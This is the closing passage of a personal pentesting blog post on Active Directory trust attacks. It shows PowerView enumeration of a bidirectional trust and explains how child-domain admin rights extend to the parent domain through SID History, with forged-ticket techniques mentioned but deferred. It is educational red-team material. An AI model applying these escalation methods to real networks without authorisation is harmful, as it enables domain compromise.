<h1 id="Bidirectional-Trusts"><a href="#Bidirectional-Trusts" class="headerlink" title="Bidirectional Trusts"></a>Bidirectional Trusts</h1><p>I don’t plan on going specifically into an attack vector for <code>bidirectional</code> trust attacks, since you can essentially perform either of the trust attacks that were listed for inbound&#x2F;outbound as explained above. I do however want to explain a few of the methods that can be used for this.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainTrust</span><br><span class="line"></span><br><span class="line">SourceName      : regex-33.dev</span><br><span class="line">TargetName      : regex-33.pro</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : </span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : 5/9/2024 10:28:52 PM</span><br><span class="line">WhenChanged     : 5/9/2024 10:28:52 PM</span><br></pre></td></tr></table></figure>

<p>Essentially this will tell us that both domains trust one another, and that both domains have access to each other’s resources. We can perform a variety of attacks as explained above, or we can create <code>Golden</code> or <code>Diamond</code> tickets used to access each of the domains.</p>
<p>If we are a domain admin or have DA privileges in the child domain, this tells us that we also have DA privileges in the parent domain. This is through the idea of SID History, which (at a basic-level) causes the domains to share SIDs amongst the domain trust. The SID of the DA account we have access to will be inherited in the parent domain due to the bidirectional relationship.</p>
<p>That’s essentially where <code>Golden</code> and <code>Diamond</code> tickets come into play, however I plan on leaving those for another post as I explained earlier. Domain dominance is a really interesting topic, and I am looking forward to researching more into it.</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Big thanks to RastaMouse and r0bit for getting me into this given the material that I’ve learned from. I encourage you all to progress through machines and chains on <code>Vulnlab</code>, as they really help with understanding Active Directory and Linux exploits; as well as just general red-team thinking.</p>
<p><strong>Resources Used</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust">https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust</a></li>
<li><a target="_blank" rel="noopener" href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d">https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains">https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-">https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-</a>*</li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/research/">research</a><a class="post-meta__tags" href="/tags/Active-Directory/">Active Directory</a></div><div class="post_share"><div class="social-share" data-image="/images/research/domain-trusts/domain_trusts.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/05/trusted/" title="Trusted - Vulnlab"><img class="cover" src="/images/vulnlab/trusted-vl/trusted_slide.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Trusted - Vulnlab</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img class="cover" src="/images/vulnlab/delegate-vl/delegate_slide.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Delegate - Vulnlab</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youssef Achtatal</div><div class="author-info__description">Pentesting & Windows security research</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/regex-33"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/regex-33" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/youssef-achtatal-5642a52b1/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.instagram.com/regex-33/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from Vulnlab & HTB, along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Trust-Enumeration"><span class="toc-text">Domain Trust Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Inbound-Trusts"><span class="toc-text">Exploiting Inbound Trusts</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Outbound-Trusts"><span class="toc-text">Exploiting Outbound Trusts</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bidirectional-Trusts"><span class="toc-text">Bidirectional Trusts</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/11/ewptx/" title="eWPTX Certification"><img src="/images/certs/eWPTXv2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="eWPTX Certification"/></a><div class="content"><a class="title" href="/2024/09/11/ewptx/" title="eWPTX Certification">eWPTX Certification</a><time datetime="2024-09-11T13:00:00.000Z" title="Created 2024-09-11 09:00:00">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/tea/" title="Tea - Vulnlab"><img src="/images/vulnlab/tea-vl/tea_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tea - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/26/tea/" title="Tea - Vulnlab">Tea - Vulnlab</a><time datetime="2024-08-26T15:48:36.000Z" title="Created 2024-08-26 11:48:36">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img src="/images/vulnlab/delegate-vl/delegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Delegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/30/delegate/" title="Delegate - Vulnlab">Delegate - Vulnlab</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/05/domain-trusts/" title="Domain &amp; Forest Trusts"><img src="/images/research/domain-trusts/domain_trusts.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Domain &amp; Forest Trusts"/></a><div class="content"><a class="title" href="/2024/06/05/domain-trusts/" title="Domain &amp; Forest Trusts">Domain &amp; Forest Trusts</a><time datetime="2024-06-06T02:35:44.000Z" title="Created 2024-06-05 22:35:44">2024-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/05/trusted/" title="Trusted - Vulnlab"><img src="/images/vulnlab/trusted-vl/trusted_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trusted - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/05/trusted/" title="Trusted - Vulnlab">Trusted - Vulnlab</a><time datetime="2024-06-05T19:20:37.000Z" title="Created 2024-06-05 15:20:37">2024-06-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youssef Achtatal</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">website</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>